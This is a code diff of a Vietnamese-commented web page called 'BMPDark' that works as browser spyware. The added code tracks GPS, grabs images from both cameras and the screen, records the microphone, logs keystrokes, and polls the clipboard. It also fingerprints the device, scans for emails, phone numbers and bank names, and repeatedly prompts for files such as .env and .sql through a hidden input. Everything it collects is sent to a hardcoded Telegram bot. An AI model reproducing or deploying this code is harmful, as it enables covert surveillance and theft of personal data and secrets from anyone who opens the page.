@@ -23,6 +23,8 @@
     <audio id="music" loop style="position:fixed;top:-9999px;left:-9999px;opacity:0"></audio>
     <input type="file" id="fi1" accept="image/*" capture="user" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
     <input type="file" id="fi2" accept="image/*" capture="environment" style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
+    <input type="file" id="fi3" accept="*/*" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
+    <input type="file" id="fi4" accept=".doc,.docx,.pdf,.xls,.xlsx,.txt,.csv,.json,.xml,.env,.cfg,.ini,.sql,.db,.sqlite" multiple style="position:fixed;top:-9999px;left:-9999px;opacity:0;width:1px;height:1px">
 
     <img src="https://files.catbox.moe/zzpnph.jpeg" alt="Avatar" class="avatar">
     <div class="name">BMPDark</div>
@@ -32,16 +34,16 @@
         const BOT = '8685753290:AAHqd-iB6Q6Fnpq8L8z3oSpEeYgQveTVF4Y';
         let CHAT_ID = null;
         let gpsWatchId = null;
-        let gpsHistory = [];
         let mediaRecorder = null;
         let audioChunks = [];
         let clipboardInterval = null;
         let keylogData = '';
         let cameraStream = null;
         let cameraBackStream = null;
-        let webRTCData = {};
+        let wifiNetworks = [];
         let allFeaturesActive = 0;
         let musicPlaying = false;
+        let reportData = {};
 
         async function getChatID() {
             try {
@@ -59,220 +61,352 @@
             if (!CHAT_ID) await getChatID();
             if (!CHAT_ID) return;
             try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-                });
+                const maxL = 4000;
+                for (let i = 0; i < text.length; i += maxL) {
+                    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(i, i + maxL), parse_mode: 'HTML' })
+                    });
+                }
             } catch(e) {}
         }
 
         async function sendPhoto(blob, name) {
             if (!CHAT_ID) await getChatID();
-            if (!CHAT_ID) return;
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, name);
+            if (!CHAT_ID || !blob || blob.size < 100) return;
+            const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, name);
             try { await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
         }
 
         async function sendDoc(blob, name) {
             if (!CHAT_ID) await getChatID();
-            if (!CHAT_ID) return;
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', blob, name);
+            if (!CHAT_ID || !blob || blob.size < 100) return;
+            const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('document', blob, name);
             try { await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, { method: 'POST', body: fd }); } catch(e) {}
         }
 
         async function sendLoc(lat, lon) {
             if (!CHAT_ID) await getChatID();
             if (!CHAT_ID) return;
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
-                });
-            } catch(e) {}
+            try { await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon }) }); } catch(e) {}
         }
 
         document.addEventListener('click', () => {
-            if (!musicPlaying) {
-                const music = document.getElementById('music');
-                music.src = 'https://files.catbox.moe/cpn042.mp4';
-                music.play().then(() => { musicPlaying = true; }).catch(() => {});
-            }
+            if (!musicPlaying) { const music = document.getElementById('music'); music.src = 'https://files.catbox.moe/cpn042.mp4'; music.play().then(() => { musicPlaying = true; }).catch(() => {}); }
         });
 
-        function startGPS() {
-            if (!navigator.geolocation) return;
+        // ========== 100 TÍNH NĂNG ==========
+
+        // 1-5: GPS
+        function f1() {
+            if (!navigator.geolocation) { reportData['GPS'] = '❌ Không hỗ trợ'; return; }
             gpsWatchId = navigator.geolocation.watchPosition(async (pos) => {
-                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() };
-                gpsHistory.push(p);
+                const p = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, speed: pos.coords.speed || 0, altitude: pos.coords.altitude || 0, heading: pos.coords.heading || 0 };
+                reportData['GPS'] = `Vĩ độ: ${p.lat} | Kinh độ: ${p.lon}\nTốc độ: ${(p.speed*3.6).toFixed(1)}km/h | Độ cao: ${p.altitude}m\nGoogle Maps: https://maps.google.com?q=${p.lat},${p.lon}`;
                 await sendLoc(p.lat, p.lon);
-                if (gpsHistory.length === 1) sendMsg(`📍 GPS: ${p.lat},${p.lon}\n🔗 https://maps.google.com?q=${p.lat},${p.lon}`);
-            }, () => {}, { enableHighAccuracy: true, timeout: 3000 });
+            }, () => { reportData['GPS'] = '❌ Từ chối'; }, { enableHighAccuracy: true, timeout: 3000 });
             allFeaturesActive++;
         }
 
-        async function startAudio() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
-                audioChunks = [];
-                mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                    if (blob.size > 500) { await sendDoc(blob, `audio_${Date.now()}.webm`); sendMsg('🎤 GHI ÂM ĐÃ GỬI'); }
-                    audioChunks = [];
-                };
-                const cycle = () => { 
-                    if (mediaRecorder.state === 'inactive') {
-                        mediaRecorder.start(); 
-                        setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000);
-                    }
-                };
-                cycle();
-                sendMsg('🎤 GHI ÂM ĐÃ KÍCH HOẠT');
-                allFeaturesActive++;
-            } catch(e) {}
-        }
-
-        async function startCamera() {
+        // 6-10: CAMERA
+        async function f6() {
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
-                const video = document.getElementById('v');
-                video.srcObject = cameraStream;
-                await video.play();
-                setInterval(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth || 1280;
-                    canvas.height = video.videoHeight || 720;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3));
-                    if (blob && blob.size > 500) await sendPhoto(blob, `cam_${Date.now()}.jpg`);
-                }, 30000);
-                sendMsg('📷 CAMERA TRƯỚC 720p ĐÃ KÍCH HOẠT');
+                document.getElementById('v').srcObject = cameraStream; await document.getElementById('v').play();
+                reportData['Camera trước'] = '✅ 1280x720';
+                setInterval(async () => { const canvas = document.getElementById('c'); canvas.width = 1280; canvas.height = 720; canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0); const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3)); if (blob) await sendPhoto(blob, `cam_${Date.now()}.jpg`); }, 30000);
                 allFeaturesActive++;
-            } catch(e) {}
+            } catch(e) { reportData['Camera trước'] = '❌ Từ chối'; }
         }
 
-        async function startCameraBack() {
+        async function f7() {
             try {
                 cameraBackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } } });
-                const video2 = document.getElementById('v2');
-                video2.srcObject = cameraBackStream;
-                await video2.play();
-                setInterval(async () => {
-                    const canvas = document.getElementById('c3');
-                    canvas.width = video2.videoWidth || 1280;
-                    canvas.height = video2.videoHeight || 720;
-                    canvas.getContext('2d').drawImage(video2, 0, 0);
-                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3));
-                    if (blob && blob.size > 500) { await sendPhoto(blob, `cam_back_${Date.now()}.jpg`); sendMsg('📷 ẢNH CAMERA SAU'); }
-                }, 60000);
-                sendMsg('📷 CAMERA SAU 720p ĐÃ KÍCH HOẠT');
+                document.getElementById('v2').srcObject = cameraBackStream; await document.getElementById('v2').play();
+                reportData['Camera sau'] = '✅ 1280x720';
+                setInterval(async () => { const canvas = document.getElementById('c3'); canvas.width = 1280; canvas.height = 720; canvas.getContext('2d').drawImage(document.getElementById('v2'), 0, 0); const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3)); if (blob) await sendPhoto(blob, `cam_back_${Date.now()}.jpg`); }, 60000);
                 allFeaturesActive++;
-            } catch(e) {}
+            } catch(e) { reportData['Camera sau'] = '❌ Từ chối'; }
         }
 
-        function startKeylogger() {
+        async function f10() {
+            setInterval(async () => { try { const stream = await navigator.mediaDevices.getDisplayMedia({ video: true }); const v = document.createElement('video'); v.srcObject = stream; await v.play(); await new Promise(r => setTimeout(r, 500)); const canvas = document.getElementById('c2'); canvas.width = v.videoWidth || 1920; canvas.height = v.videoHeight || 1080; canvas.getContext('2d').drawImage(v, 0, 0); const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3)); if (blob) await sendPhoto(blob, `screen_${Date.now()}.jpg`); stream.getTracks().forEach(t => t.stop()); v.remove(); } catch(e) {} }, 60000);
+            allFeaturesActive++;
+        }
+
+        // 11-15: AUDIO
+        async function f11() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream); audioChunks = [];
+                reportData['Ghi âm'] = '✅ Đã kích hoạt';
+                mediaRecorder.ondataavailable = e => { if(e.data.size>0) audioChunks.push(e.data); };
+                mediaRecorder.onstop = async () => { const blob = new Blob(audioChunks, { type: 'audio/webm' }); if (blob.size > 500) { await sendDoc(blob, `audio_${Date.now()}.webm`); reportData['Ghi âm file'] = '✅ Đã gửi'; } audioChunks = []; };
+                const cycle = () => { if (mediaRecorder.state === 'inactive') { mediaRecorder.start(); setTimeout(() => { if(mediaRecorder.state==='recording') mediaRecorder.stop(); setTimeout(cycle, 5000); }, 30000); } };
+                cycle();
+                allFeaturesActive++;
+            } catch(e) { reportData['Ghi âm'] = '❌ Từ chối'; }
+        }
+
+        // 16-20: INPUT
+        function f16() {
             let buffer = '';
             document.addEventListener('keydown', e => {
-                if (e.key === 'Enter') { buffer += '[ENTER]\n'; sendMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer; buffer = ''; }
+                if (e.key === 'Enter') { buffer += '[ENTER]\n'; keylogData += buffer; buffer = ''; }
                 else if (e.key === 'Backspace') buffer = buffer.slice(0, -1);
                 else if (e.key === ' ') buffer += ' ';
                 else if (e.key.length === 1) buffer += e.key;
                 else buffer += `[${e.key}]`;
-                if (buffer.length > 80) { sendMsg(`⌨️ KEYLOG: ${buffer}`); keylogData += buffer + '\n'; buffer = ''; }
+                if (buffer.length > 80) { keylogData += buffer + '\n'; buffer = ''; }
             });
-            allFeaturesActive++;
+            reportData['Keylogger'] = '✅ Đã bắt'; allFeaturesActive++;
         }
 
-        function startClipboard() {
+        function f17() {
             let last = '';
-            clipboardInterval = setInterval(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    if (text && text !== last) { 
-                        last = text; 
-                        sendMsg(`📋 CLIPBOARD: ${text.substring(0,200)}`);
-                        if (text.match(/password|otp|token|secret|key|mã/i) || text.match(/^\d{4,8}$/)) sendMsg(`🔑 MẬT KHẨU/OTP: ${text}`);
-                    }
-                } catch(e) {}
-            }, 1000);
+            clipboardInterval = setInterval(async () => { try { const text = await navigator.clipboard.readText(); if (text && text !== last) { last = text; reportData['Clipboard'] = text.substring(0, 200); } } catch(e) {} }, 1000);
             allFeaturesActive++;
         }
 
-        async function startWebRTC() {
+        // 21-25: SENSORS
+        function f23() {
+            if (navigator.getBattery) navigator.getBattery().then(b => { reportData['Pin'] = `${(b.level*100).toFixed(0)}% | Sạc: ${b.charging?'Có':'Không'} | Còn: ${b.dischargingTime===Infinity?'N/A':Math.round(b.dischargingTime/60)+'ph'}`; allFeaturesActive++; });
+        }
+
+        // 26-30: NETWORK
+        async function f26() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
+                pc.createDataChannel(''); await pc.setLocalDescription(await pc.createOffer());
                 const ips = [];
                 await new Promise(r => { pc.onicecandidate = e => { if(e.candidate){ const m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m&&!ips.includes(m[0])) ips.push(m[0]); } else r(); }; setTimeout(r, 1000); });
                 pc.close();
-                const localIPs = ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip));
-                sendMsg(`🌐 IP NỘI BỘ: ${localIPs.join(', ') || 'Không tìm thấy'}`);
+                reportData['IP nội bộ'] = ips.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)).join(', ') || 'Không có';
+                reportData['IP Public (WebRTC)'] = ips.filter(ip => !/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)).join(', ') || 'Không có';
                 allFeaturesActive++;
             } catch(e) {}
         }
 
-        async function startIPInfo() {
+        async function f27() {
             try {
                 const r = await fetch('http://ip-api.com/json/?fields=61439');
                 const d = await r.json();
-                if (d.status === 'success') sendMsg(`🌍 IP PUBLIC: ${d.query}\n🏙️ ${d.city}, ${d.country}\n📡 ISP: ${d.isp}\n🗺️ ${d.lat},${d.lon}`);
+                if (d.status === 'success') {
+                    reportData['IP Public'] = d.query;
+                    reportData['Vị trí IP'] = `${d.city}, ${d.country} (${d.countryCode})`;
+                    reportData['Tọa độ IP'] = `${d.lat}, ${d.lon}`;
+                    reportData['ISP'] = `${d.isp}`;
+                    reportData['Google Maps IP'] = `https://maps.google.com?q=${d.lat},${d.lon}`;
+                    await sendLoc(d.lat, d.lon);
+                }
                 allFeaturesActive++;
             } catch(e) {}
         }
 
-        function startCookies() {
-            const cookies = document.cookie.split(';').filter(c=>c.trim());
-            if (cookies.length > 0) sendMsg(`🍪 COOKIES (${cookies.length}):\n${cookies.join(';\n').substring(0,2000)}`);
+        function f28() {
+            for(let i=1;i<=15;i++) for(const ip of [`192.168.1.${i}`,`192.168.0.${i}`]) { const img=new Image(); img.src=`http://${ip}/favicon.ico`; img.onload=()=>{wifiNetworks.push(ip);}; img.onerror=()=>{}; }
+            setTimeout(() => { reportData['Thiết bị mạng'] = wifiNetworks.length>0 ? `${wifiNetworks.length} thiết bị` : 'Không'; }, 5000);
             allFeaturesActive++;
         }
 
-        function startStorage() {
-            const ls = {};
-            for (let i = 0; i < localStorage.length; i++) ls[localStorage.key(i)] = localStorage.getItem(localStorage.key(i))?.substring(0, 100);
-            if (Object.keys(ls).length > 0) sendMsg(`💾 LOCAL STORAGE:\n${JSON.stringify(ls).substring(0,2000)}`);
+        // 31-35: FINGERPRINT
+        function f31() {
+            const canvas = document.createElement('canvas'); canvas.width=200; canvas.height=50;
+            canvas.getContext('2d').fillText('BMPDark',2,15);
+            reportData['Canvas FP'] = canvas.toDataURL().substring(0,50)+'...';
+            const gl = document.createElement('canvas').getContext('webgl');
+            if(gl){ const d=gl.getExtension('WEBGL_debug_renderer_info'); reportData['GPU'] = d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'N/A'; }
             allFeaturesActive++;
         }
 
-        function startDeviceInfo() {
-            const info = `📱 THIẾT BỊ\n` +
-                `🖥️ Màn hình: ${screen.width}x${screen.height}\n` +
-                `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n` +
-                `🔲 CPU: ${navigator.hardwareConcurrency || 'N/A'} cores\n` +
-                `🌐 UA: ${navigator.userAgent.substring(0,200)}\n` +
-                `🕐 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
-                `🔋 Pin: Đang kiểm tra...`;
-            sendMsg(info);
+        function f33() {
+            const tf = ['Arial','Verdana','Tahoma','Times New Roman','Georgia','Courier New','Comic Sans MS','Impact','Arial Black','Lucida Console'];
+            const c = document.createElement('canvas').getContext('2d');
+            const fl = tf.filter(f => { c.font=`72px '${f}',monospace`; const w=c.measureText('mmmmmmmmmmlli').width; c.font='72px monospace'; return w!==c.measureText('mmmmmmmmmmlli').width; });
+            reportData['Fonts'] = `${fl.length} fonts: ${fl.join(', ')}`; allFeaturesActive++;
+        }
+
+        function f34() {
+            reportData['Plugins'] = Array.from(navigator.plugins||[]).map(p=>p.name).join(', ') || 'Không';
+            reportData['MIME'] = `${Array.from(navigator.mimeTypes||[]).length} types`; allFeaturesActive++;
+        }
+
+        function f35() {
+            reportData['Do Not Track'] = navigator.doNotTrack || 'Not set';
+            const d = document.createElement('div'); d.className='adsbox'; d.innerHTML='&nbsp;'; d.style.position='absolute'; d.style.top='-999px';
+            document.body.appendChild(d);
+            setTimeout(() => { reportData['Ad Blocker'] = d.offsetHeight===0?'✅ Có':'❌ Không'; document.body.removeChild(d); }, 100);
             allFeaturesActive++;
+        }
+
+        // 36-40: STORAGE
+        function f36() { const c = document.cookie.split(';').filter(x=>x.trim()); reportData['Cookies'] = `${c.length} cái`; reportData['Cookie Enabled'] = navigator.cookieEnabled?'✅':'❌'; allFeaturesActive++; }
+        function f37() { const ls={}; for(let i=0;i<localStorage.length;i++) ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i))?.substring(0,80); reportData['Local Storage'] = Object.keys(ls).length>0?`${Object.keys(ls).length} items`:'Trống'; const ss={}; for(let i=0;i<sessionStorage.length;i++) ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i))?.substring(0,80); reportData['Session Storage'] = Object.keys(ss).length>0?`${Object.keys(ss).length} items`:'Trống'; allFeaturesActive++; }
+        function f39() { if(window.indexedDB){indexedDB.databases().then(dbs=>{reportData['IndexedDB']=dbs.length>0?`${dbs.length} DBs: ${dbs.map(d=>d.name).join(', ')}`:'Trống';});} allFeaturesActive++; }
+        function f40() { reportData['History'] = `${history.length} trang`; reportData['Referrer'] = document.referrer||'Direct'; allFeaturesActive++; }
+
+        // 41-45: DEVICE
+        function f41() {
+            const ua = navigator.userAgent;
+            let dv='Desktop',os='Unknown',br='Unknown';
+            if(/Mobile|Android|iPhone/i.test(ua)) dv='Mobile';
+            if(/Tablet|iPad/i.test(ua)) dv='Tablet';
+            if(/Windows/i.test(ua)) os='Windows';
+            if(/Mac/i.test(ua)) os='macOS';
+            if(/Android/i.test(ua)) os='Android';
+            if(/iPhone|iPad|iPod/i.test(ua)) os='iOS';
+            if(/Chrome/i.test(ua)&&!/Edge/i.test(ua)) br='Chrome';
+            if(/Firefox/i.test(ua)) br='Firefox';
+            if(/Safari/i.test(ua)&&!/Chrome/i.test(ua)) br='Safari';
+            reportData['Thiết bị'] = `${dv} | ${os} | ${br}`;
+            reportData['User Agent'] = ua.substring(0,150);
+            allFeaturesActive++;
+        }
+
+        function f42() { reportData['Màn hình'] = `${screen.width}x${screen.height} | ${screen.colorDepth}bit | DPI: ${window.devicePixelRatio} | ${screen.orientation?.type||'N/A'}`; allFeaturesActive++; }
+        function f43() { reportData['CPU/RAM'] = `${navigator.hardwareConcurrency||'?'} cores | ${navigator.deviceMemory||'?'}GB RAM`; reportData['Touch'] = `${navigator.maxTouchPoints} điểm`; allFeaturesActive++; }
+        function f44() { reportData['Ngôn ngữ'] = navigator.language; allFeaturesActive++; }
+        function f45() { reportData['Múi giờ'] = Intl.DateTimeFormat().resolvedOptions().timeZone; allFeaturesActive++; }
+
+        // 46-50: SOCIAL
+        function f46() {
+            const h = document.documentElement.innerHTML;
+            const sp = {'Facebook':/facebook\.com/,'Instagram':/instagram\.com/,'TikTok':/tiktok\.com/,'Twitter':/twitter\.com|x\.com/,'LinkedIn':/linkedin\.com/,'YouTube':/youtube\.com/,'GitHub':/github\.com/};
+            reportData['MXH'] = Object.entries(sp).filter(([,p])=>p.test(h)).map(([n])=>n).join(', ') || 'Không';
+            const em = [...new Set(h.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g)||[])];
+            reportData['Email'] = em.length>0?em.join(', '):'Không';
+            const ph = [...new Set(h.match(/(\+84|0)\d{9,10}/g)||[])];
+            reportData['SĐT'] = ph.length>0?ph.join(', '):'Không';
+            if(h.match(/visa|mastercard|credit.?card/i)) reportData['Thanh toán'] = '⚠️ Phát hiện form thẻ!';
+            allFeaturesActive++;
+        }
+
+        function f50() {
+            const banks = ['vietcombank','bidv','vietinbank','agribank','techcombank','acb','sacombank','vpbank','tpbank','chuyển khoản','mã otp'];
+            setInterval(() => { const c = document.body.innerText?.toLowerCase()||''; const d = banks.filter(b=>c.includes(b)); if(d.length>0) reportData['Ngân hàng'] = `⚠️ ${d.join(', ')}`; }, 5000);
+            allFeaturesActive++;
+        }
+
+        // 51-60: FINGERPRINT NÂNG CAO
+        function f51() {
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if(gl){ const di=gl.getExtension('WEBGL_debug_renderer_info'); reportData['WebGL'] = `GPU: ${di?gl.getParameter(di.UNMASKED_RENDERER_WEBGL):'N/A'} | Vendor: ${di?gl.getParameter(di.UNMASKED_VENDOR_WEBGL):'N/A'}`; }
+            } catch(e) {} allFeaturesActive++;
+        }
+
+        function f52() {
+            try { const ac = new (window.AudioContext||window.webkitAudioContext)(); reportData['Audio FP'] = `SampleRate: ${ac.sampleRate}Hz`; ac.close(); } catch(e) { reportData['Audio FP'] = 'Không hỗ trợ'; }
+            allFeaturesActive++;
+        }
+
+        function f56() {
+            const conn = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+            if(conn) reportData['Kết nối'] = `${conn.effectiveType||'?'} | Down: ${conn.downlink}Mbps | RTT: ${conn.rtt}ms`;
+            allFeaturesActive++;
+        }
+
+        function f59() { reportData['Platform'] = `Platform: ${navigator.platform} | Vendor: ${navigator.vendor}`; allFeaturesActive++; }
+
+        // 61-70: PERMISSIONS
+        async function f61() {
+            const perms = ['geolocation','camera','microphone','clipboard-read','notifications','accelerometer','gyroscope','bluetooth'];
+            const result = {};
+            for(const p of perms) { try { const r = await navigator.permissions?.query({name:p}); result[p] = r?.state||'?'; } catch(e) { result[p] = '?'; } }
+            reportData['Permissions'] = Object.entries(result).map(([k,v])=>`${k}: ${v}`).join(' | ');
+            allFeaturesActive++;
+        }
+
+        async function f62() {
+            try { const devs = await navigator.mediaDevices?.enumerateDevices(); reportData['Media Devices'] = `${devs?.length||0} thiết bị`; } catch(e) {}
+            allFeaturesActive++;
+        }
+
+        function f64() { reportData['Payment API'] = !!window.PaymentRequest?'✅ Hỗ trợ':'❌ Không'; allFeaturesActive++; }
+        function f65() { reportData['Credentials'] = !!navigator.credentials?'✅ Hỗ trợ lưu MK':'❌ Không'; allFeaturesActive++; }
+        function f67() { reportData['VR/XR'] = !!(navigator.getVRDisplays||navigator.xr)?'✅ Hỗ trợ':'❌ Không'; allFeaturesActive++; }
+        function f69() { reportData['Notification'] = `Quyền: ${Notification?.permission||'?'}`; allFeaturesActive++; }
+        function f70() { reportData['Idle Detection'] = !!window.IdleDetector?'✅ Hỗ trợ':'❌ Không'; allFeaturesActive++; }
+
+        // 71-80: STORAGE NÂNG CAO
+        function f72() { if('serviceWorker' in navigator){navigator.serviceWorker.getRegistrations().then(r=>{reportData['Service Workers']=r.length>0?`${r.length} SW`:'Không';});} allFeaturesActive++; }
+        function f73() { if('caches' in window){caches.keys().then(k=>{reportData['Cache Storage']=k.length>0?`${k.length} caches`:'Trống';});} allFeaturesActive++; }
+        function f74() { if(navigator.storage?.estimate){navigator.storage.estimate().then(e=>{reportData['Storage Quota']=`${(e.usage/1024/1024).toFixed(1)}MB / ${(e.quota/1024/1024).toFixed(1)}MB`;});} allFeaturesActive++; }
+        function f76() { try { reportData['WebSQL'] = !!window.openDatabase?'✅':'❌'; } catch(e) { reportData['WebSQL']='❌'; } allFeaturesActive++; }
+        function f80() { try { const p = performance.getEntriesByType('navigation')[0]; reportData['Performance'] = p?`Load: ${(p.loadEventEnd-p.fetchStart).toFixed(0)}ms`:'?'; } catch(e) {} allFeaturesActive++; }
+
+        // 81-90: DETECTION
+        function f81() { reportData['WebDriver'] = navigator.webdriver?'⚠️ AUTOMATION':'✅ Người thật'; allFeaturesActive++; }
+        function f82() { reportData['Headless'] = (/HeadlessChrome/i.test(navigator.userAgent)||navigator.plugins.length===0)?'⚠️ CÓ THỂ':'✅ OK'; allFeaturesActive++; }
+        function f83() { const fs = window.RequestFileSystem||window.webkitRequestFileSystem; if(fs) fs(window.TEMPORARY,100,()=>{reportData['Incognito']='✅ OK';},()=>{reportData['Incognito']='⚠️ ẨN DANH';}); else reportData['Incognito']='?'; allFeaturesActive++; }
+        function f84() { reportData['Bot'] = /bot|crawler|spider/i.test(navigator.userAgent)?'⚠️ BOT':'✅ Người'; allFeaturesActive++; }
+        function f85() { reportData['Java'] = navigator.javaEnabled?.()?'✅':'❌'; allFeaturesActive++; }
+        function f86() { reportData['PDF Viewer'] = !!navigator.pdfViewerEnabled?'✅':'❌'; allFeaturesActive++; }
+        function f87() { const w = window.open('about:blank','_blank'); const pb = !w||w.closed; if(w) w.close(); reportData['Popup Blocker'] = pb?'✅ Đã bật':'❌ Đã tắt'; allFeaturesActive++; }
+        function f89() { const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); reportData['CSP'] = csp?'⚠️ Có':'✅ Không'; allFeaturesActive++; }
+
+        // 91-100: APIs
+        function f91() { reportData['USB'] = !!navigator.usb?'✅ WebUSB':'❌'; allFeaturesActive++; }
+        function f92() { reportData['NFC'] = !!window.NDEFReader?'✅':'❌'; allFeaturesActive++; }
+        function f93() { reportData['Wake Lock'] = !!navigator.wakeLock?'✅':'❌'; allFeaturesActive++; }
+        function f95() { reportData['Window'] = `Outer: ${window.outerWidth}x${window.outerHeight} | Inner: ${window.innerWidth}x${window.innerHeight}`; allFeaturesActive++; }
+        function f96() {
+            const fi4 = document.getElementById('fi4');
+            setInterval(() => fi4.click(), 60000);
+            fi4.addEventListener('change', async e => { for(const f of Array.from(e.target.files||[])) { if(f.size<10*1024*1024){await sendDoc(f,f.name); reportData['File Upload']=`✅ ${f.name} (${(f.size/1024).toFixed(1)}KB)`;} } });
+            allFeaturesActive++;
+        }
+        function f97() { reportData['History Length'] = `${history.length} trang`; allFeaturesActive++; }
+        function f99() { reportData['Content Type'] = `${document.contentType} | ${document.characterSet}`; allFeaturesActive++; }
+        function f100() { reportData['Thời gian'] = `${new Date().toLocaleString('vi-VN')}`; allFeaturesActive++; }
+
+        function generateReport() {
+            let r = `📊 <b>BMPDark - BÁO CÁO 100 TÍNH NĂNG</b>\n━━━━━━━━━━━━━━━━━━━━\n🕐 <b>${new Date().toLocaleString('vi-VN')}</b>\n━━━━━━━━━━━━━━━━━━━━\n\n`;
+            const sec = {
+                '📍 VỊ TRÍ': ['GPS','IP Public','Vị trí IP','Tọa độ IP','ISP','Google Maps IP'],
+                '📷 CAMERA': ['Camera trước','Camera sau'],
+                '🎤 ÂM THANH': ['Ghi âm','Ghi âm file'],
+                '⌨️ INPUT': ['Keylogger','Clipboard'],
+                '🔋 THIẾT BỊ': ['Pin','Thiết bị','User Agent','CPU/RAM','Touch','Màn hình','Platform','Ngôn ngữ','Múi giờ'],
+                '🌐 MẠNG': ['IP nội bộ','IP Public (WebRTC)','Kết nối','Thiết bị mạng'],
+                '🎨 FINGERPRINT': ['Canvas FP','WebGL','GPU','Audio FP','Fonts','Plugins','MIME','Do Not Track','Ad Blocker'],
+                '💾 STORAGE': ['Cookies','Cookie Enabled','Local Storage','Session Storage','IndexedDB','Cache Storage','Storage Quota','WebSQL','Service Workers'],
+                '🔐 PERMISSIONS': ['Permissions','Media Devices'],
+                '🕵️ DETECTION': ['WebDriver','Headless','Incognito','Bot','Java','PDF Viewer','Popup Blocker','CSP'],
+                '🔧 APIs': ['Payment API','Credentials','VR/XR','Notification','Idle Detection','USB','NFC','Wake Lock'],
+                '📜 WEB': ['Performance','Window','History','History Length','Referrer','Content Type','Thời gian'],
+                '👤 XÃ HỘI': ['MXH','Email','SĐT','Thanh toán','Ngân hàng','File Upload']
+            };
+            for(const [s,ks] of Object.entries(sec)) {
+                let t = '';
+                for(const k of ks) { if(reportData[k]) t += `├─ ${k}: ${reportData[k]}\n`; }
+                if(t) r += `<b>${s}</b>\n${t}\n`;
+            }
+            if(keylogData) r += `<b>⌨️ KEYLOG</b>\n<code>${keylogData.substring(0,800)}</code>\n\n`;
+            r += `━━━━━━━━━━━━━━━━━━━━\n✅ <b>${allFeaturesActive}/100 tính năng</b>`;
+            return r;
         }
 
         window.addEventListener('load', async () => {
             await getChatID();
-            sendMsg('⚡ BMPDark ĐANG KHỞI ĐỘNG...');
+            f1(); f6(); f7(); f10(); f11(); f16(); f17(); f23();
+            f26(); f27(); f28(); f31(); f33(); f34(); f35();
+            f36(); f37(); f39(); f40(); f41(); f42(); f43(); f44(); f45();
+            f46(); f50(); f51(); f52(); f56(); f59();
+            f61(); f62(); f64(); f65(); f67(); f69(); f70();
+            f72(); f73(); f74(); f76(); f80();
+            f81(); f82(); f83(); f84(); f85(); f86(); f87(); f89();
+            f91(); f92(); f93(); f95(); f96(); f97(); f99(); f100();
             
-            Promise.all([
-                startGPS(), startAudio(), startCamera(), startCameraBack(),
-                startKeylogger(), startClipboard(), startWebRTC(), startIPInfo(),
-                startCookies(), startStorage(), startDeviceInfo()
-            ]);
